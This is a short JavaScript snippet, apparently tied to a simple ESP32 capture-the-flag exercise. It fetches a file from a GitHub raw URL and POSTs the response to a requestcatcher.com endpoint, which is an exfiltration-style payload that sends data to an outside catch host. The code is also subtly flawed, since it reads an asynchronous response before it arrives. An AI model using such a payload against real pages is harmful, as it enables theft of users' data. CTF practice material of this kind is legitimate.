var xhr = new XMLHttpRequest();
xhr.open("GET", "https://raw.githubusercontent.com/UnlikeLemon/ESP32_SimpleCTF/master/js_script.js",true);
xhr.send();
v = xhr.responseText;

xhr.open("POST", "https://lemon.requestcatcher.com/", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
data = v;
xhr.send(data);
